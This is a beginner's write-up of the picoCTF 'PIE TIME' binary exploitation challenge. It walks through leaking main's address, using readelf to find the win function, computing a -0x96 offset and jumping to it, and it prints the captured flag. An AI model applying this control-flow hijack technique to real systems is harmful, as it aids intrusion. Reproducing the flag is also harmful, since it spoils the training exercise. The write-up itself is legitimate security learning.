# [PIE TIME - Position Independent Executable Bypass and my 1st Binary Exploitation](https://play.picoctf.org/practice/challenge/490?page=1)!

**Challenge Description**  
Can you try to get the flag? Beware we have PIE! Connect to the program with netcat:
```bash
$ nc rescued-float.picoctf.net 55154
```

The program's source code can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/9127b5d4702bd2d788c046f5a70326130d416c5812ffc8196ebb0337faf0d11a/vuln.c). The binary can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/9127b5d4702bd2d788c046f5a70326130d416c5812ffc8196ebb0337faf0d11a/vuln)! (The links might not work as the URL changes whenever the instance is opened)

**Category**: Binary Exploitation  
**Difficulty**: Easy  

## Complete Newbie Perspective

As someone who:
- Just completed my first CTF challenge (a web exploitation one)
- Had zero knowledge about binary exploitation
- Didn't understand common vulnerabilities like buffer overflows, format strings, etc. or how to even identify/exploit them.
- Didn't even know what tools to use

Here's how I somehow solved this:

### The Blind Approach

1. **Total Confusion Phase xD**  
   - Ran `checksec` but didn't understand terms like "RELRO", "Canary", or why "PIE" mattered
   - Saw the source code but didn't recognize potential vulnerabilities
   - Didn't know what `__globals__` or function pointers were

2. **Accidental Discovery(After 1 hour..)**  
   The program gave me two crucial hints:
   
   After I used:
   ```bash
   $ nc rescued-float.picoctf.net 55154
   ```

   It showed me:

   ```bash
   Address of main: 0x62d9dde6e33d
   Enter the address to jump to...
   ```

   Which made me think: "Maybe I can make it go somewhere else?"

### Step-by-Step Solution (Through Trial & Error)

1. **Finding Function Locations**  
Stumbled upon using `readelf` after searching online:
```bash
readelf -s ./pie_time | grep -E 'main|win'
```

Got:
```bash
66: 00000000000012a7   150 FUNC    GLOBAL DEFAULT   16 win
70: 000000000000133d   204 FUNC    GLOBAL DEFAULT   16 main
```

2. Mathy Mathy time

    win is at 0x12a7

    main at 0x133d

    Offset = 0x12a7 - 0x133d = -0x96(Apparently, the relative addresses stay the same!And I know the main address!)

3. The Lucky Guess
   
    win_address = leaked_main (0x62d9dde6e33d) - 0x96 = 0x62d9dde6e2a7

Typed 0x62d9dde6e2a7 and miraculously got:
```bash
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}
```

[This solution took 4 hours, 23 Google searches, and 3 failed attempts as a complete binary exploitation newbie]

[Special thanks to random StackOverflow posts and YouTube tutorials]
